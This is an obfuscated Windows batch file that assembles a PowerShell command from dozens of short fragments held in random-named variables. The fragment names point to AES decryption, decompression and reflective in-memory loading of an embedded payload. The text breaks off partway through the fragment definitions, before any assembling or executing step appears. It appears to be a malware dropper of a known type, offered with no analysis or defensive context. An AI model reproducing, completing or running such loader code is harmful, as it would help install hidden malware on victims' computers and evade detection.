@echo off
%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%s%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%e%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%t%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%l%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%o%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%c%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%a%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%l%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT% %yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%e%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%n%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%a%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%b%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%l%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%e%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%d%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%e%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%l%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%a%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%y%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%e%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%d%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%e%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%x%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%p%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%a%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%n%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%s%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%i%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%o%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%n%yHRghgespzMTkEcKUajKLpvOYorOWTsmxppRyJKFMECzdfQoOT%
set "EhaMcMEgZeAYxkiIxYfhIPTIuALTodBQQdFlsmsFzeMzBGbvdw=s"
set "rKTXePnssBaKSVCJiuEWplFAIEcuhNzpQSMRXSZQYaTREOlQXR=t"
set "DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd=!EhaMcMEgZeAYxkiIxYfhIPTIuALTodBQQdFlsmsFzeMzBGbvdw!e!rKTXePnssBaKSVCJiuEWplFAIEcuhNzpQSMRXSZQYaTREOlQXR!"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "qgpIRMUKOn=Disp"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "EEUmoeGCfT=ell\"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "mEKiaretah=s_va"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "wPDVDtDvdX='#',"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "uYDHyxtzMw=Invo"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "TKeqpLpMlt=ace("
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jqcHOYViUI=ar);"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ruNIbqsAeK=on $"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "qVyMalMmRB=tryP"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NEYxgzdqsk=ram2"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ZyjnaaymLc=Qk.D"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "HwOctHqpQk=Repl"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "lBNBQVQKvM=aram"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "KBIelNrLPF=[Sys"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "LhnQZPlvFo=ity."
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "aCOpUXXkoq=turn"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "dsEWEkWGxE=','A"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "VAzkpDvgGR=tZvr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "zvAKiijSjn=e('@"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "kLFCBUorCk=comp"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NlbSxavSAi=.IV="
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "AHDCqrSuWE=ogra"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "umKmfkOIin=dows"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "mxaQqjRkFo=ke($"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "WeYiBbXlna=Stre"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ZXrnAarNsS=_var"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "rLioSHftjW=grkM"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "yDYEoxOIfi=QWQk"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "CiDlKtOJYk=);$t"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "SgkUHeNRME=ZT9G"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "tmPKfnMNwi=Padd"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "hzTiVDllOG=_fun"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jtDCwepJot=]::C"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ABjgLhLjgR=Lnlt"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "QmkYCXpbVL=null"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "TlhNYShmTS=am_v"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "cSzdCKTXuT=ersh"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "RDMsuwvvRb=.Fil"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "YRRZCaRfAT=Stri"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "srMQZNrmQp=ng($"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ocMJQGKxyq=.IO."
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "VAwmcXBLmy=New-"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "UuDynZfnFg=\Sys"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "UojuKyPqFk=oad("
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "OqwwgAwVok= $eK"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "UXptieykJJ=r=$a"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "PsfhmVHDxd=payl"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "midtIgkviB=EzGl"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "OoTYQUjUfP=_var"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "CjiLhJxZXG=LDb="
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "UlGmgimciS=echo"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "OPVJBWukXi=e();"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "PbnzWSHyRL=ode]"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "HAraiZrWiJ=deco"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "LfNyDGDvUq= "%systemdrive%"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "YtRUJAsAQV=ompr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "xvSOaeQAdd=rypt"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "gAiKDtkkEw=$aes"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "vmTGLJWzlU=\pow"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "qeFoOmkzRM=wuxm"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "YeeGMNRXyx=Wquj"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "KYfHcrCWDY=rGEw"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "bhOvEmFOMd=ert]"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jyrPBNCwOJ=,$pa"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "juMAnMPulU=rypt"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "qLDlrnZVvi=ompr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "hfxCAPybyc=ock("
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "wqrpuLquxZ=I.Ra"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "xFrEkzhvdI=cute"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "SLosbptZxd=es_v"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "zIxToiscQt=$kQW"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NXFJJvzHCx=$qUn"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jEuHdBzHpR=m.IO"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "msnQPlAwNj=:New"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "RwzrpKlGhS=eDec"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "pcfcjaIfUd=('#'"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "IiEhCPLwjr=('Ix"
